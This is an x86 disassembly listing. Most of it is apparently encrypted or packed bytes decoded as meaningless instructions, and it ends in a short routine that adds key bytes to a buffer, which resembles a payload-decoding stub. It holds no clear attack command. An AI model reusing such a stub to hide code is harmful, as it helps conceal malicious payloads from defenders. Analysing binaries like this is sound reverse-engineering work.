  41642f:	jg     0x416471
  416431:	adc    BYTE PTR [ebp+edi*1+0x9],dl
  416435:	sti    
  416436:	jle    0x4163e9
  416438:	aas    
  416439:	pop    esi
  41643a:	sub    eax,DWORD PTR [edi-0x52c32fc1]
  416440:	and    esi,DWORD PTR [ebx-0x66]
  416443:	dec    ebp
  416444:	mov    ecx,0xd316530e
  416449:	sub    eax,0xea1c2678
  41644e:	hlt    
  41644f:	loop   0x416476
  416451:	xor    DWORD PTR [ebp+0x27e44098],esp
  416457:	es js  0x4164d4
  41645a:	push   ds
  41645b:	mov    ch,0x6b
  41645d:	xor    esp,DWORD PTR [edi]
  41645f:	jb     0x4164dc
  416461:	sbb    BYTE PTR ds:0x9e2eb808,0x85
  416468:	inc    edx
  416469:	dec    ebx
  41646a:	(bad)  
  41646b:	adc    BYTE PTR [ebp-0x54],al
  41646e:	rol    ch,cl
  416470:	idiv   DWORD PTR [ebx-0x17]
  416473:	xchg   ebp,eax
  416474:	dec    ecx
  416475:	inc    edx
  416476:	sbb    esi,esi
  416478:	push   cs
  416479:	mov    ds:0xd24ec2d4,eax
  41647e:	in     eax,0x14
  416480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416481:	mov    dl,0x39
  416483:	imul   eax,DWORD PTR [ebp+0x4a],0xcc06bd4c
  41648a:	mov    esp,0xcb375579
  41648f:	ror    BYTE PTR [ecx+0x439f1f5f],0x41
  416496:	dec    ecx
  416497:	pop    esi
  416498:	pop    esi
  416499:	mov    esp,DWORD PTR [edi+edx*4]
  41649c:	js     0x416466
  41649e:	int3   
  41649f:	jmp    FWORD PTR [ecx-0x752d171d]
  4164a5:	mov    edi,0x88b833dc
  4164aa:	retf   0xac03
  4164ad:	cwde   
  4164ae:	rcl    DWORD PTR [esi+ecx*8+0x671e6629],cl
  4164b5:	dec    esi
  4164b6:	test   al,al
  4164b8:	xlat   BYTE PTR ds:[ebx]
  4164b9:	psllw  mm7,mm4
  4164bc:	mov    ah,0xb9
  4164be:	aas    
  4164bf:	and    dh,cl
  4164c1:	inc    edx
  4164c2:	mov    esp,0xd2129d2b
  4164c7:	xor    DWORD PTR [ebx],ebp
  4164c9:	mov    bl,0xb9
  4164cb:	imul   esp,DWORD PTR [edi-0x2f],0x94d75cbe
  4164d2:	mov    ebx,0x415191d1
  4164d7:	mov    cs,WORD PTR [edx+0x7c6d10e6]
  4164dd:	daa    
  4164de:	push   cs
  4164df:	mov    edi,0x69be387f
  4164e4:	inc    esp
  4164e5:	fcmovnu st,st(5)
  4164e7:	mov    DWORD PTR [eax],esi
  4164e9:	inc    edi
  4164ea:	jae    0x4164ae
  4164ec:	(bad)
  4164ef:	sbb    DWORD PTR [edi],edx
  4164f1:	pop    eax
  4164f2:	test   DWORD PTR [ebp-0x6880846b],esp
  4164f8:	add    ch,BYTE PTR es:[ebp-0x1c]
  4164fc:	cwde   
  4164fd:	jle    0x416487
  4164ff:	(bad)  
  416500:	clc    
  416501:	jg     0x416564
  416503:	jmp    0x8157e853
  416508:	inc    ebp
  416509:	imul   ebp,DWORD PTR [ebp+0x1b],0x37eeb6d3
  416510:	ins    BYTE PTR es:[edi],dx
  416511:	xchg   DWORD PTR [esi],esi
  416513:	mov    edi,?
  416515:	adc    eax,0xd0574c5c
  41651a:	xor    al,0x38
  41651c:	jmp    0x2342:0x2fb33b4a
  416523:	fbld   TBYTE PTR [ecx+0x3d]
  416526:	xor    al,0xa2
  416528:	xor    BYTE PTR [eax-0x3c],bh
  41652b:	out    dx,al
  41652c:	rol    DWORD PTR [ebp-0x11],0x28
  416530:	lahf   
  416531:	scas   al,BYTE PTR es:[edi]
  416532:	mov    ebp,0x156fdc5d
  416537:	jp     0x416566
  416539:	(bad)  
  41653a:	out    0x9f,eax
  41653c:	clc    
  41653d:	xchg   ebx,eax
  41653e:	push   ss
  41653f:	call   0x82f1:0xdf31f0af
  416546:	sahf   
  416547:	shr    BYTE PTR [esi+0x7a10510b],0x7d
  41654e:	sub    DWORD PTR [ecx+0x3ac26adc],ecx
  416554:	outs   dx,DWORD PTR ds:[esi]
  416555:	or     al,0x10
  416557:	push   0x46
  416559:	or     DWORD PTR [esp+eax*2-0x51],ebp
  41655d:	fbstp  TBYTE PTR [ecx]
  41655f:	mov    ebx,0x43f3b6c7
  416564:	pop    esi
  416565:	cmp    esi,ebx
  416567:	fstp   DWORD PTR [edx]
  416569:	(bad)  
  41656a:	outs   dx,DWORD PTR ds:[esi]
  41656b:	pop    es
  41656c:	repz push ebx
  41656e:	or     eax,0xc98eee56
  416573:	lock shl DWORD PTR [edx+0x1b],1
  416577:	sub    BYTE PTR ds:0x218b17c6,bl
  41657d:	nop
  41657e:	(bad)  
  416580:	sub    esp,ebp
  416582:	adc    al,0xb7
  416584:	shl    DWORD PTR [ecx-0x29],0xa8
  416588:	sbb    DWORD PTR [eax+0x39175eee],edx
  41658e:	fistp  QWORD PTR [edi-0x464f65ba]
  416594:	inc    eax
  416595:	dec    edi
  416596:	iret   
  416597:	shr    DWORD PTR ds:[eax+ebp*4-0x5f6e6761],cl
  41659f:	mov    ah,0x73
  4165a1:	xchg   edx,eax
  4165a2:	div    BYTE PTR [edi]
  4165a4:	add    ecx,edx
  4165a6:	xor    al,0x24
  4165a8:	or     eax,0x5ac84294
  4165ad:	mov    ebp,0x108ab783
  4165b2:	inc    ebx
  4165b3:	xor    al,0x2d
  4165b5:	dec    esi
  4165b6:	std    
  4165b7:	imul   ebp,DWORD PTR fs:[edx+0x37af03b6],0x5340cdc1
  4165c2:	scas   eax,DWORD PTR es:[edi]
  4165c3:	xor    bh,BYTE PTR [ecx]
  4165c5:	pop    edi
  4165c6:	pop    es
  4165c7:	lods   al,BYTE PTR ds:[esi]
  4165c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165c9:	(bad)  
  4165ca:	fisubr DWORD PTR [ecx-0x3c]
  4165cd:	ret    
  4165ce:	cmc    
  4165cf:	mov    dh,0x8e
  4165d1:	hlt    
  4165d2:	jp     0x4165cc
  4165d4:	mov    ebp,0x106b704e
  4165d9:	lods   al,BYTE PTR ds:[esi]
  4165da:	add    BYTE PTR [ebx+0x6b],bl
  4165dd:	shl    BYTE PTR [ebx-0x76],cl
  4165e0:	sar    BYTE PTR [edi+0x51],cl
  4165e3:	and    eax,0xd39b3a58
  4165e8:	daa    
  4165e9:	ja     0x4165d8
  4165eb:	jl     0x416620
  4165ed:	jno    0x416618
  4165ef:	mov    dl,0xf0
  4165f1:	repnz imul esi,DWORD PTR [edx-0x483946c1],0x25
  4165f9:	jmp    0x10a0:0x84b0b135
  416600:	xchg   esp,eax
  416601:	das    
  416602:	sub    al,0xa3
  416604:	int    0xe3
  416606:	popa   
  416607:	(bad)  
  416608:	jbe    0x4165fe
  41660a:	ja     0x41666b
  41660c:	mov    ebx,DWORD PTR [esi-0x52]
  41660f:	push   ebp
  416610:	mov    bh,0x77
  416612:	inc    edx
  416613:	nop
  416614:	mov    bh,0xf6
  416616:	or     esi,ebp
  416618:	loopne 0x41665c
  41661a:	lahf   
  41661b:	xchg   BYTE PTR [esi+0x1e237952],bl
  416621:	icebp  
  416622:	into   
  416623:	sbb    eax,0xb294487c
  416628:	lods   al,BYTE PTR ds:[esi]
  416629:	and    BYTE PTR [esi-0x23982bf8],al
  41662f:	inc    esp
  416630:	das    
  416631:	into   
  416632:	fbstp  TBYTE PTR [ecx-0x32f60c55]
  416638:	pop    ebp
  416639:	ins    BYTE PTR es:[edi],dx
  41663a:	icebp  
  41663b:	cwde   
  41663c:	adc    BYTE PTR [eax],bh
  41663e:	nop
  41663f:	(bad)  
  416640:	rcr    BYTE PTR [edx+edx*1+0x3af8db09],cl
  416647:	fldenv [edi+ecx*8+0x11331f9d]
  41664e:	adc    DWORD PTR [eax],ebx
  416650:	add    edx,DWORD PTR gs:[edi+0x16790c0]
  416657:	stos   DWORD PTR es:[edi],eax
  416658:	push   ebp
  416659:	jno    0x416698
  41665b:	mov    edi,0x5dfaee8
  416660:	test   ebx,esp
  416662:	pusha  
  416663:	mov    bl,0x23
  416665:	out    dx,al
  416666:	(bad)  
  416667:	push   cs
  416668:	ds mov ah,0x1a
  41666b:	pop    esp
  41666c:	lea    eax,[ecx]
  41666e:	jmp    0x895:0x34ad2ffb
  416675:	movups XMMWORD PTR [ebx+0x221dd6a9],xmm6
  41667c:	or     dl,dl
  41667e:	xchg   BYTE PTR [ecx+0x3f246aa9],bh
  416684:	add    BYTE PTR [esp+ebp*8+0x4a],bl
  416688:	push   0xd
  41668a:	mov    dh,0x46
  41668c:	sbb    ecx,esp
  41668e:	add    eax,0x91b9a390
  416693:	ret    0x4e27
  416696:	dec    eax
  416697:	xchg   esi,eax
  416698:	mov    dl,0x36
  41669a:	push   ebx
  41669b:	dec    esp
  41669c:	sub    BYTE PTR [edi-0x568642c],0xa0
  4166a3:	mov    dh,0x1
  4166a5:	add    eax,0xa3a5b60c
  4166aa:	mov    esi,0xa624e726
  4166af:	dec    ecx
  4166b0:	into   
  4166b1:	mov    esp,0xb3488a93
  4166b6:	out    dx,al
  4166b7:	add    al,0xa0
  4166b9:	push   cs
  4166ba:	imul   edi,DWORD PTR cs:[edx+0x1a503e6a],0x7f1c95bb
  4166c5:	daa    
  4166c6:	xchg   BYTE PTR [ecx+eiz*8-0x687ffbbd],bl
  4166cd:	adc    al,0x27
  4166cf:	lods   al,BYTE PTR ds:[esi]
  4166d0:	mov    esp,0x530fc71c
  4166d5:	inc    eax
  4166d6:	mov    edi,ebp
  4166d8:	push   es
  4166d9:	outs   dx,DWORD PTR ds:[esi]
  4166da:	or     DWORD PTR [esi+eiz*4+0x5501b829],edx
  4166e1:	bswap  edx
  4166e3:	das    
  4166e4:	xchg   edx,eax
  4166e5:	xor    ecx,esp
  4166e7:	mov    edi,0x2b0f4ede
  4166ec:	cli    
  4166ed:	enter  0xf120,0x37
  4166f1:	jge    0x4166d3
  4166f3:	shl    BYTE PTR [edi],0x62
  4166f6:	out    0xde,al
  4166f8:	sub    ch,al
  4166fa:	xchg   edi,eax
  4166fb:	call   0xc572:0xde45a7d0
  416702:	and    ebx,DWORD PTR [esi+0x680c27bc]
  416708:	or     al,0x12
  41670a:	xchg   DWORD PTR [edx+ebx*4-0x28],edi
  41670e:	popf   
  41670f:	sub    al,0xc
  416711:	jmp    0xe7477ff6
  416716:	sub    BYTE PTR [ebp+edx*2+0x35bd0333],dh
  41671d:	jp     0x416779
  41671f:	sub    eax,0xe367ff47
  416724:	stc    
  416725:	mov    ah,0x3
  416727:	adc    al,0x82
  416729:	fisub  DWORD PTR [edi]
  41672b:	repz sti 
  41672d:	xchg   ebx,eax
  41672e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672f:	jge    0x416765
  416731:	nop
  416732:	push   esp
  416733:	imul   DWORD PTR [esi]
  416735:	das    
  416736:	xchg   edi,eax
  416737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416738:	or     ecx,ebx
  41673a:	pop    ecx
  41673b:	push   edi
  41673c:	jmp    0x55e9a961
  416741:	adc    BYTE PTR [ebx-0x56be314d],dl
  416747:	les    ebx,FWORD PTR [esi+0x5ab29248]
  41674d:	ins    BYTE PTR es:[edi],dx
  41674e:	in     eax,dx
  41674f:	out    0x47,al
  416751:	inc    esp
  416752:	out    0xa2,eax
  416754:	mov    WORD PTR [ebp-0x2f1b96b9],gs
  41675a:	cmc    
  41675b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41675c:	jo     0x4166fe
  41675e:	dec    ebp
  41675f:	rcl    BYTE PTR [edi-0x54c620ea],0xbf
  416766:	in     al,0xb1
  416768:	pop    ds
  416769:	cld    
  41676a:	sbb    eax,0x523096b3
  41676f:	inc    edx
  416770:	xor    eax,0x344771ce
  416775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416776:	mov    ebx,esp
  416778:	dec    ebp
  416779:	test   bl,0x4c
  41677c:	gs (bad) 
  41677e:	lahf   
  41677f:	sub    dh,BYTE PTR [ebx+ecx*1-0x1c]
  416783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416784:	inc    eax
  416785:	adc    eax,0x6624dd7b
  41678a:	jge    0x416797
  41678c:	jmp    0x416780
  41678e:	xor    BYTE PTR [esi+0x5f],bl
  416791:	test   eax,0xfb4c900c
  416796:	fcomp  DWORD PTR [edi-0x56]
  416799:	jmp    0x8c5b:0x66174356
  4167a0:	outs   dx,BYTE PTR ds:[esi]
  4167a1:	jne    0x4167fc
  4167a3:	fld    DWORD PTR [edx-0x59]
  4167a6:	je     0x416811
  4167a8:	push   ebx
  4167a9:	scas   eax,DWORD PTR es:[edi]
  4167aa:	push   esi
  4167ab:	cmovge edi,DWORD PTR [ebp-0x21]
  4167af:	add    eax,0xe857e619
  4167b4:	xlat   BYTE PTR ds:[ebx]
  4167b5:	xchg   BYTE PTR ds:0x24cb6e11,ch
  4167bb:	mov    dl,0xd2
  4167bd:	out    dx,eax
  4167be:	or     bl,BYTE PTR [esi]
  4167c0:	loope  0x416771
  4167c2:	int3   
  4167c3:	pusha  
  4167c4:	or     eax,0x57457acb
  4167c9:	into   
  4167ca:	inc    ecx
  4167cb:	jne    0x41676d
  4167cd:	mov    eax,ds:0xf8e0f780
  4167d2:	fst    DWORD PTR [edi]
  4167d4:	cmp    BYTE PTR [edx+0x1dafe116],bh
  4167da:	adc    bl,BYTE PTR [ebp-0x10e1b7f7]
  4167e0:	mov    DWORD PTR [edx],edi
  4167e2:	jecxz  0x41682e
  4167e4:	dec    esp
  4167e5:	xor    ah,bh
  4167e7:	je     0x4167cd
  4167e9:	sub    bh,BYTE PTR [eax+ecx*4]
  4167ec:	pop    eax
  4167ed:	xchg   edx,eax
  4167ee:	adc    ebp,ebx
  4167f0:	outs   dx,BYTE PTR ds:[esi]
  4167f1:	test   eax,0x5953c738
  4167f6:	and    DWORD PTR [esi],esi
  4167f8:	jb     0x416814
  4167fa:	or     DWORD PTR ds:0x9e13e91f,edi
  416800:	(bad)  
  416801:	jno    0x416853
  416803:	or     DWORD PTR [eax],edx
  416805:	aas    
  416806:	push   0x23e008a3
  41680b:	sub    DWORD PTR [esi],edi
  41680d:	fist   DWORD PTR [esi]
  41680f:	cmp    edi,eax
  416811:	(bad)  
  416813:	xor    ecx,ebp
  416815:	aas    
  416816:	pop    es
  416817:	ss xchg ecx,eax
  416819:	jnp    0x416839
  41681b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41681c:	pop    esi
  41681d:	pop    esi
  41681e:	dec    ebp
  41681f:	pop    ebx
  416820:	cmp    BYTE PTR [eax+eiz*2-0xb],dh
  416824:	xchg   edi,eax
  416825:	cmp    ebp,edx
  416827:	aam    0x14
  416829:	nop
  41682a:	adc    esi,DWORD PTR [eax-0x43cd0b4a]
  416830:	bound  edx,QWORD PTR [ebp+0x12d5e463]
  416836:	bound  eax,QWORD PTR [edi+0x52db79a1]
  41683c:	mov    ebp,0xbd6a85a8
  416841:	xor    al,0x63
  416843:	jge    0x4167d3
  416845:	inc    eax
  416846:	jnp    0x4167e3
  416848:	call   DWORD PTR [edi+esi*4+0x11]
  41684c:	cli    
  41684d:	mov    ds:0xba2d20c1,eax
  416852:	cli    
  416853:	jge    0x416821
  416855:	clc    
  416856:	jnp    0x41680c
  416858:	pop    edx
  416859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41685a:	rcl    DWORD PTR [edi-0x772ded88],0x98
  416861:	outs   dx,DWORD PTR ds:[esi]
  416862:	lahf   
  416863:	mov    ah,0x15
  416865:	imul   ecx,DWORD PTR [edx+edi*2-0x34],0xf2fb32
  41686d:	fimul  WORD PTR [eax+0x45]
  416870:	pop    ss
  416871:	test   al,0x56
  416873:	retf   
  416874:	and    al,0x48
  416876:	jb     0x4168d8
  416878:	enter  0x43b,0x3b
  41687c:	or     ebx,DWORD PTR [edi]
  41687e:	ja     0x41688e
  416880:	pop    edx
  416881:	sub    ah,dl
  416883:	into   
  416884:	out    dx,eax
  416885:	mov    ah,0x2b
  416887:	jns    0x41683f
  416889:	or     eax,0xc31eb3db
  41688e:	nop
  41688f:	mov    DWORD PTR [ebx],edi
  416891:	or     ecx,DWORD PTR [esi-0x524e8fba]
  416897:	mov    ecx,0x52a6de9c
  41689c:	add    ebx,DWORD PTR [ecx-0x67]
  41689f:	mov    ds:0x1e12838c,eax
  4168a4:	inc    eax
  4168a5:	dec    edx
  4168a6:	(bad)  
  4168a9:	fadd   QWORD PTR ss:[eax+0xb75265b]
  4168b0:	das    
  4168b1:	push   ebp
  4168b2:	mov    al,ds:0xe084211b
  4168b7:	shr    DWORD PTR [esi-0x1a344bb2],0xeb
  4168be:	loope  0x41687c
  4168c0:	sub    edi,0xffffff94
  4168c3:	mov    bl,0xc5
  4168c5:	sbb    al,0xc7
  4168c7:	div    BYTE PTR [esi+eiz*8]
  4168ca:	test   eax,0x16058f39
  4168cf:	sub    eax,0xdc4e466a
  4168d4:	retf   
  4168d5:	iret   
  4168d6:	clc    
  4168d7:	(bad)  
  4168d8:	dec    esi
  4168d9:	jne    0x416861
  4168db:	aaa    
  4168dc:	repnz sub ebp,DWORD PTR [edi-0x1dd961eb]
  4168e3:	xor    dh,BYTE PTR [eax-0x5d]
  4168e6:	jp     0x41688c
  4168e8:	in     eax,0x28
  4168ea:	mov    dh,BYTE PTR gs:0x1d3ec862
  4168f1:	clc    
  4168f2:	mov    esp,0x4a7f2195
  4168f7:	inc    edx
  4168f8:	jns    0x416900
  4168fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168fb:	sub    DWORD PTR [edx+0x61],0x10dbc229
  416902:	jle    0x4168ac
  416904:	pop    ecx
  416905:	sar    ebp,0x62
  416908:	pop    esp
  416909:	fadd   st(5),st
  41690b:	call   0x173ac505
  416910:	out    0x7a,al
  416912:	and    BYTE PTR [eax-0x6703cb56],ch
  416918:	mov    BYTE PTR [esi-0x3bb7e9a2],dl
  41691e:	cld    
  41691f:	jge    0x416950
  416921:	xor    eax,0xfc73596b
  416926:	shl    cl,cl
  416928:	ffreep st(3)
  41692a:	push   0xffffff91
  41692c:	ss jle 0x416900
  41692f:	add    al,0x14
  416931:	adc    dl,BYTE PTR [ecx-0x22480af5]
  416937:	push   edi
  416938:	aam    0x4f
  41693a:	out    dx,al
  41693b:	or     cl,BYTE PTR [edi+0x673b3e00]
  416941:	jmp    0x41694c
  416943:	and    BYTE PTR [edx+esi*4],0x22
  416947:	iret   
  416948:	ins    DWORD PTR es:[edi],dx
  416949:	inc    edi
  41694a:	dec    edx
  41694b:	mov    bh,0x97
  41694d:	ror    BYTE PTR [edi],cl
  41694f:	xchg   edi,eax
  416950:	adc    esp,ebx
  416952:	popf   
  416953:	gs cli 
  416955:	adc    ecx,eax
  416957:	adc    cl,al
  416959:	xor    eax,0x3d45b7dd
  41695e:	nop
  41695f:	popf   
  416960:	mov    cl,0x9e
  416962:	sbb    al,0x80
  416964:	in     al,dx
  416965:	inc    esi
  416966:	in     al,dx
  416967:	out    0x5e,eax
  416969:	je     0x41698e
  41696b:	xchg   esp,eax
  41696c:	imul   edx,esi,0x17
  41696f:	mov    WORD PTR [eax+edi*8],?
  416972:	sbb    ebx,ebx
  416974:	loop   0x4169a9
  416976:	std    
  416977:	cmp    al,BYTE PTR [edx]
  416979:	cmp    DWORD PTR [esi],edx
  41697b:	push   eax
  41697c:	mov    eax,ds:0xe66ebfc
  416981:	lahf   
  416982:	aad    0x68
  416984:	jb     0x4169b3
  416986:	mov    bl,0xc8
  416988:	mov    ch,0x46
  41698a:	imul   DWORD PTR [esi+0x65]
  41698d:	sub    eax,DWORD PTR [ebx+ecx*4+0x75]
  416991:	cld    
  416992:	call   esi
  416994:	mov    DWORD PTR [ebp-0x38],eax
  416997:	cmp    DWORD PTR [ebp-0x38],0x57
  41699b:	jne    0x4169a9
  41699d:	mov    edx,DWORD PTR [ebp-0x20]
  4169a0:	push   edx
  4169a1:	call   0x401000
  4169a6:	add    esp,0x4
  4169a9:	xor    eax,eax
  4169ab:	pop    esi
  4169ac:	mov    esp,ebp
  4169ae:	pop    ebp
  4169af:	ret    
  4169b0:	push   ebp
  4169b1:	mov    ebp,esp
  4169b3:	sub    esp,0x124
  4169b9:	xor    eax,eax
  4169bb:	mov    esp,ebp
  4169bd:	pop    ebp
  4169be:	ret    
  4169bf:	push   ebp
  4169c0:	mov    ebp,esp
  4169c2:	sub    esp,0x2c
  4169c5:	push   ebx
  4169c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4169cd:	mov    DWORD PTR [ebp-0xc],0x0
  4169d4:	mov    DWORD PTR [ebp-0x20],0x1
  4169db:	mov    DWORD PTR [ebp-0x10],0x0
  4169e2:	mov    eax,DWORD PTR [ebp+0xc]
  4169e5:	mov    DWORD PTR [ebp-0x1c],eax
  4169e8:	mov    DWORD PTR [ebp-0x18],0x0
  4169ef:	mov    DWORD PTR [ebp-0x8],0x0
  4169f6:	mov    DWORD PTR [ebp-0x24],0x0
  4169fd:	mov    ecx,DWORD PTR [ebp-0x4]
  416a00:	sub    ecx,0x1
  416a03:	mov    DWORD PTR [ebp-0x4],ecx
  416a06:	mov    edx,DWORD PTR [ebp+0x8]
  416a09:	mov    DWORD PTR [ebp-0x10],edx
  416a0c:	mov    DWORD PTR [ebp-0x28],0x1
  416a13:	mov    eax,DWORD PTR [ebp-0x4]
  416a16:	add    eax,0x2
  416a19:	mov    DWORD PTR [ebp-0x4],eax
  416a1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  416a1f:	add    ecx,DWORD PTR [ebp-0x4]
  416a22:	mov    dl,BYTE PTR [ecx+0x1]
  416a25:	mov    BYTE PTR [ebp-0x11],dl
  416a28:	mov    eax,DWORD PTR [ebp-0x4]
  416a2b:	add    eax,0x1
  416a2e:	mov    DWORD PTR [ebp-0x4],eax
  416a31:	mov    cl,BYTE PTR [ebp-0x11]
  416a34:	mov    BYTE PTR [ebp-0x29],cl
  416a37:	push   edx
  416a38:	pop    ebx
  416a39:	mov    ecx,ebx
  416a3b:	mov    edx,DWORD PTR [ebp-0x10]
  416a3e:	add    edx,DWORD PTR [ebp-0x4]
  416a41:	mov    al,BYTE PTR [ebp-0x29]
  416a44:	mov    BYTE PTR [edx],al
  416a46:	mov    ebx,esi
  416a48:	mov    ecx,DWORD PTR [ebp+0x14]
  416a4b:	add    ecx,DWORD PTR [ebp-0x8]
  416a4e:	movzx  edx,BYTE PTR [ecx]
  416a51:	mov    DWORD PTR [ebp-0xc],edx
  416a54:	mov    eax,DWORD PTR [ebp-0x8]
  416a57:	mov    ecx,DWORD PTR [ebp-0x28]
  416a5a:	add    eax,ecx
  416a5c:	mov    DWORD PTR [ebp-0x8],eax
  416a5f:	mov    eax,DWORD PTR [ebp-0x8]
  416a62:	shr    eax,0x3
  416a65:	mov    ecx,0x1
  416a6a:	sub    ecx,eax
  416a6c:	mov    DWORD PTR [ebp-0x20],ecx
  416a6f:	shr    eax,cl
  416a71:	mov    edx,DWORD PTR [ebp-0x8]
  416a74:	imul   edx,DWORD PTR [ebp-0x20]
  416a78:	mov    DWORD PTR [ebp-0x8],edx
  416a7b:	shl    ebx,0x3
  416a7e:	mov    eax,DWORD PTR [ebp-0x10]
  416a81:	add    eax,DWORD PTR [ebp-0x4]
  416a84:	movzx  ecx,BYTE PTR [eax]
  416a87:	add    ecx,DWORD PTR [ebp-0xc]
  416a8a:	mov    edx,DWORD PTR [ebp-0x10]
  416a8d:	add    edx,DWORD PTR [ebp-0x4]
  416a90:	mov    BYTE PTR [edx],cl
  416a92:	mov    eax,DWORD PTR [ebp-0x4]
  416a95:	sub    eax,0x2
  416a98:	mov    DWORD PTR [ebp-0x4],eax
  416a9b:	mov    ecx,DWORD PTR [ebp-0x4]
  416a9e:	cmp    ecx,DWORD PTR [ebp+0x10]
  416aa1:	jl     0x416a13
  416aa7:	pop    ebx
  416aa8:	mov    esp,ebp
  416aaa:	pop    ebp
  416aab:	ret    
  416aac:	jmp    DWORD PTR ds:0x417020
